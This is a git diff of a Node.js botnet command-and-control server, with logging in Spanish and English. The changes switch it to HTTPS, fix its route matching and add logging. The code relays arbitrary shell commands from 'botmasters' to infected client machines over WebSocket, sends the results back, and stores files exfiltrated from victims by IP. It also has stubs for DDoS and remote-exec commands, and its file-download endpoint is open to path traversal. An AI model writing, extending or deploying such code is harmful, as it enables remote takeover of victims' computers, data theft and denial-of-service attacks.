@@ -1,8 +1,9 @@
 const http = require('http');
+const https = require('https')
 const WebSocket = require('ws');
 const auth = require('basic-auth');
-const { save_file } = require ('./results_handlers')
-const { setup } = require ('./setup.js')
+const { save_file } = require('./results_handlers')
+const { setup } = require('./setup.js')
 const fs = require("fs");
 
 const port = 3000;
@@ -23,15 +24,25 @@ const authenticate = (req, res) => {
     return true;
 };
 
+const options = {
+    cert: fs.readFileSync('cert.pem'),
+    key: fs.readFileSync('key.pem')
+};
 
-const server = http.createServer((req, res) => {
+const server = https.createServer(options, (req, res) => {
+
+    console.log(`http://${req.headers.host}`)
     const url = new URL(req.url, `http://${req.headers.host}`);
+    console.log(url)
 
-    if (!authenticate(req, res))
+    console.log("Received a request.")
+
+    if (!authenticate(req, res)) {
+        console.log("Bad authentication.")
         return;
-    
+    }
 
-    if (req.method === 'POST' && url.host === 'send-command') {
+    if (req.method === 'POST' && url.pathname === '/send-command') {
 
         let body = '';
         req.on('data', chunk => {
@@ -50,11 +61,11 @@ const server = http.createServer((req, res) => {
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ status: 'Command received and pushed to clients' }));
         });
-    } else if (req.method === 'GET' && url.host === 'download') {
+    } else if (req.method === 'GET' && url.pathname === '/download') {
 
         const objective = url.searchParams.get('objective');
         const file_name = url.searchParams.get('filename');
-        if (objective && file_name){
+        if (objective && file_name) {
             try {
                 const data = fs.readFileSync("downloads/" + objective + "/" + file_name, 'utf-8');
                 // TODO optional hash for integrity check
@@ -77,11 +88,13 @@ const server = http.createServer((req, res) => {
             res.end(JSON.stringify({ error: 'File not found' }));
         }
 
-    } else if (req.method === 'GET' && url.host === 'bots') {
+    } else if (req.method === 'GET' && url.pathname === '/bots') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ bots: Object.keys(clients) }));
 
     } else {
+        console.log("Unknown request method.")
+        console.log(req.url, url.pathname, req.body)
         res.writeHead(404, { 'Content-Type': 'text/plain' });
         res.end('Not Found');
     }
@@ -90,30 +103,30 @@ const server = http.createServer((req, res) => {
 const wss_shell = new WebSocket.Server({ port: 8080 });
 
 wss_shell.on('connection', (ws, req) => {
-  console.log('Nuevo botmaster conectado');
-  const ip = req.connection.remoteAddress;
-  botmasters[ip] = ws;
-  ws.on('message', message => {
-    console.log(`Recibido: ${message}`);
-    const result = JSON.parse(message);
-    console.log(Object.keys(clients))
+    console.log('Nuevo botmaster conectado');
+    const ip = req.connection.remoteAddress;
+    botmasters[ip] = ws;
+    ws.on('message', message => {
+        console.log(`Recibido: ${message}`);
+        const result = JSON.parse(message);
+        console.log(Object.keys(clients))
 
-    if (result.objective in clients){
-        const command = {
-            id: result.id,
-            sh_cmd: result.sh_cmd,
-            botmaster: ip,
-            command: 'Shell'
+        if (result.objective in clients) {
+            const command = {
+                id: result.id,
+                sh_cmd: result.sh_cmd,
+                botmaster: ip,
+                command: 'Shell'
 
+            }
+            clients[result.objective].send(JSON.stringify(command))
+        } else {
+            ws.send(JSON.stringify({ error: 'Objective does not exist' }));
         }
-        clients[result.objective].send(JSON.stringify(command))
-    } else {
-        ws.send(JSON.stringify({error: 'Objective does not exist'}));
-    }
-  });
-  ws.on('close', () => {
-      console.log("Botmaster desconectado")
-      delete botmasters[ip];
+    });
+    ws.on('close', () => {
+        console.log("Botmaster desconectado")
+        delete botmasters[ip];
     });
 });
 
@@ -126,33 +139,33 @@ wss.on('connection', (ws, req) => {
     console.log('New WebSocket connection from:', ip);
 
     clients[ip] = ws;
-        ws.on('message', message => {
-            const result = JSON.parse(message);
-            switch (result.type) {
-                case "DDoS":
-                    break;
-                case "Download":
-                    console.log('Received result from client: ', ip);
-                    save_file(result, ip)
-                    break;
+    ws.on('message', message => {
+        const result = JSON.parse(message);
+        switch (result.type) {
+            case "DDoS":
+                break;
+            case "Download":
+                console.log('Received result from client: ', ip);
+                save_file(result, ip)
+                break;
 
-                case "Exec":
-                    break;
+            case "Exec":
+                break;
 
-                case "Shell":
-                    console.log('Received shell result from client: ', ip)
+            case "Shell":
+                console.log('Received shell result from client: ', ip)
 
-                    botmasters[result.botmaster].send(result.result)
-                    break;
+                botmasters[result.botmaster].send(result.result)
+                break;
 
-                default:
-                    console.log("Comando no reconocido.")
-                    break;
-            }
-            // Handle client result, e.g., store it in a database
-        });
+            default:
+                console.log("Comando no reconocido.")
+                break;
+        }
+        // Handle client result, e.g., store it in a database
+    });
 
-        ws.on('close', () => {
+    ws.on('close', () => {
         clients = clients.filter(client => client !== ws);
     });
 });
